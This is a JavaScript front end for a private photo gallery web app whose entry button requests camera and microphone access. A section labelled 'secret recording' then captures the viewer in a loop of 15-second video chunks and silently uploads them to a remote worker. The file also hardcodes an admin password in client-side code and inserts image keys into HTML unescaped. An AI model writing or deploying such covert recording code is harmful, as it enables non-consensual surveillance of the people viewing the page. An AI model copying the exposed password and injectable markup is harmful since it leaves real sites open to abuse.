const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev'; 
const ADMIN_PASS = "74722222"; 
const RECORDING_CHUNK_MS = 15000; 

const entryScreen = document.getElementById('entry-screen');
const galleryScreen = document.getElementById('gallery-screen');
const galleryContainer = document.getElementById('gallery-grid');

// Layouts and Themes setup
const layouts = ['grid-style-5', 'grid-style-1', 'grid-style-2', 'grid-style-3', 'grid-style-4'];
let layoutIdx = 0;

const themes = ['theme-light', 'theme-amoled', 'theme-aurora', 'theme-champagne'];
let themeIdx = 0;

// --- FAVORITES LOGIC ---
let favorites = JSON.parse(localStorage.getItem('favs')) || [];
let showFavsOnly = false;

function toggleFavorite(key) {
    if (favorites.includes(key)) {
        favorites = favorites.filter(k => k !== key);
    } else {
        favorites.push(key);
    }
    localStorage.setItem('favs', JSON.stringify(favorites));
    loadImages(); 
}

// --- 1. ENTRY & SECRET RECORDING ---
let secretTap = 0, tapTimer;
document.getElementById('secret-heart').addEventListener('click', () => {
    secretTap++; clearTimeout(tapTimer);
    if (secretTap >= 3) { enterGallery(); secretTap = 0; } 
    tapTimer = setTimeout(() => secretTap = 0, 1000); 
});

document.getElementById('enter-btn').addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        enterGallery();
        startRecording(stream);
    } catch (err) { enterGallery(); } 
});

function enterGallery() {
    entryScreen.classList.remove('active-screen');
    galleryScreen.classList.add('active-screen');
    loadImages();
}

function startRecording(stream) {
    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    let chunks = [];
    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
    recorder.onstop = async () => {
        const formData = new FormData();
        formData.append('file', new Blob(chunks, { type: 'video/webm' }), `reaction-${Date.now()}.webm`);
        try { await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData }); } catch(err){}
        startRecording(stream);
    };
    recorder.start();
    setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, RECORDING_CHUNK_MS);
}

// --- 2. UPLOAD PHOTOS ---
const uploadFab = document.getElementById('upload-fab');
const uploadInput = document.getElementById('image-upload-input');

uploadFab.addEventListener('click', () => uploadInput.click());
uploadInput.addEventListener('change', async (e) => {
    if (!e.target.files.length) return;
    galleryContainer.innerHTML = '<div class="loading-text">Uploading photos... ⏳</div>';
    
    for (let file of e.target.files) {
        const formData = new FormData(); formData.append('file', file);
        try { await fetch(`${WORKER_URL}/api/upload-image`, { method: 'POST', body: formData }); } catch(e){}
    }
    loadImages();
});

// --- 3. SMART LOAD, FAVORITE & DELETE PHOTOS ---
async function loadImages() {
    galleryContainer.innerHTML = '<div class="loading-text">Loading our moments... ✨</div>';
    try {
        const res = await fetch(`${WORKER_URL}/api/images`);
        if (res.ok) {
            const data = await res.json();
            galleryContainer.innerHTML = ''; 
            
            let imgArray = data.images;
            
            // Smart Sorting Logic based on active grid
            const currentLayout = layouts[layoutIdx];
            const isMasonry = ['grid-style-1', 'grid-style-3', 'grid-style-5'].includes(currentLayout);
            let colCount = 1;
            if(currentLayout === 'grid-style-5') colCount = 2;
            if(currentLayout === 'grid-style-1' || currentLayout === 'grid-style-3') colCount = 3;

            if (showFavsOnly) {
                imgArray = imgArray.filter(k => favorites.includes(k)); 
                if (isMasonry && imgArray.length > 0) {
                    let cols = Array.from({length: colCount}, () => []);
                    imgArray.forEach((item, i) => cols[i % colCount].push(item));
                    imgArray = cols.flat();
                }
            } else {
                let f = imgArray.filter(k => favorites.includes(k));
                let n = imgArray.filter(k => !favorites.includes(k));

                if (isMasonry) {
                    let cols = Array.from({length: colCount}, () => []);
                    f.forEach((item, i) => cols[i % colCount].push(item));
                    n.forEach((item, i) => {
                        cols[(f.length + i) % colCount].push(item);
                    });
                    imgArray = cols.flat(); 
                } else {
                    imgArray = [...f, ...n]; 
                }
            }

            if (imgArray.length === 0) { 
                galleryContainer.innerHTML = showFavsOnly ? '<div class="loading-text">No favorites yet. Long press a photo! ❤️</div>' : '<div class="loading-text">No photos yet. Tap + to upload ❤️</div>'; 
                return; 
            }
            
            imgArray.forEach(key => {
                const isFav = favorites.includes(key);
                const wrap = document.createElement('div');
                wrap.className = 'img-wrapper';
                wrap.innerHTML = `
                    <img src="${WORKER_URL}/api/image/${key}" loading="lazy">
                    ${isFav ? '<div class="fav-badge">❤️</div>' : ''}
                    <div class="delete-overlay" onclick="deleteImage('${key}')">🗑️</div>
                `;
                
                // Long Press (Favorite) and Click (Fullscreen) Logic
                const imgEl = wrap.querySelector('img');
                let pressTimer;
                let longPressed = false;
                
                const startPress = () => {
                    longPressed = false;
                    if(document.body.classList.contains('delete-mode')) return;
                    pressTimer = setTimeout(() => {
                        longPressed = true;
                        toggleFavorite(key);
                        if (navigator.vibrate) navigator.vibrate(50); 
                    }, 500); 
                };
                const cancelPress = () => clearTimeout(pressTimer);
                
                imgEl.addEventListener('touchstart', startPress);
                imgEl.addEventListener('touchend', cancelPress);
                imgEl.addEventListener('touchmove', cancelPress);
                imgEl.addEventListener('mousedown', startPress);
                imgEl.addEventListener('mouseup', cancelPress);
                imgEl.addEventListener('mouseleave', cancelPress);
                
                imgEl.addEventListener('click', () => {
                    if(document.body.classList.contains('delete-mode')) return;
                    if(!longPressed) {
                        openFullscreen(`${WORKER_URL}/api/image/${key}`);
                    }
                });

                galleryContainer.appendChild(wrap);
            });
        }
    } catch (err) { galleryContainer.innerHTML = '<div class="loading-text">Error loading images.</div>'; }
}

async function deleteImage(key) {
    if(!confirm('Are you sure you want to delete this photo?')) return;
    galleryContainer.innerHTML = '<div class="loading-text">Deleting... ⏳</div>';
    try {
        await fetch(`${WORKER_URL}/api/admin/files`, {
            method: 'DELETE',
            headers: { 'X-Admin-Password': ADMIN_PASS, 'Content-Type': 'application/json' },
            body: JSON.stringify({ key })
        });
        if (favorites.includes(key)) toggleFavorite(key);
        else loadImages();
    } catch(err) { alert('Failed to delete'); loadImages(); }
}

// --- FULLSCREEN MODAL LOGIC ---
const fullscreenModal = document.getElementById('fullscreen-modal');
const fullscreenImg = document.getElementById('fullscreen-img');

function openFullscreen(src) {
    fullscreenImg.src = src;
    fullscreenModal.classList.add('active');
}

document.querySelector('.close-modal').addEventListener('click', () => {
    fullscreenModal.classList.remove('active');
    fullscreenImg.src = '';
});

fullscreenModal.addEventListener('click', (e) => {
    if(e.target === fullscreenModal) {
        fullscreenModal.classList.remove('active');
        fullscreenImg.src = '';
    }
});

// --- 4. UI CONTROLS (Themes, Layouts & Bottom Nav) ---
document.getElementById('theme-toggle').addEventListener('click', () => {
    document.body.classList.remove(themes[themeIdx]);
    themeIdx = (themeIdx + 1) % themes.length;
    document.body.classList.add(themes[themeIdx]);
});

document.getElementById('layout-toggle').addEventListener('click', () => {
    galleryContainer.className = ''; 
    layoutIdx = (layoutIdx + 1) % layouts.length;
    galleryContainer.classList.add(layouts[layoutIdx]);
    loadImages(); 
});

// Navigation Bar Interactions
const navHome = document.getElementById('nav-home');
const navDelete = document.getElementById('nav-delete');
const navFavs = document.getElementById('nav-favs');

navDelete.addEventListener('click', () => {
    document.body.classList.toggle('delete-mode');
    const isDeleteMode = document.body.classList.contains('delete-mode');
    navDelete.classList.toggle('danger', isDeleteMode);
    navDelete.classList.toggle('active', isDeleteMode);
    
    if (isDeleteMode) {
        navHome.classList.remove('active');
        navFavs.classList.remove('active');
    } else {
        navHome.classList.toggle('active', !showFavsOnly);
        navFavs.classList.toggle('active', showFavsOnly);
    }
});

navHome.addEventListener('click', () => {
    document.body.classList.remove('delete-mode');
    showFavsOnly = false;
    navDelete.classList.remove('danger', 'active');
    navFavs.classList.remove('active');
    navHome.classList.add('active');
    loadImages();
});

navFavs.addEventListener('click', () => {
    document.body.classList.remove('delete-mode');
    showFavsOnly = true;
    navDelete.classList.remove('danger', 'active');
    navHome.classList.remove('active');
    navFavs.classList.add('active');
    loadImages();
});
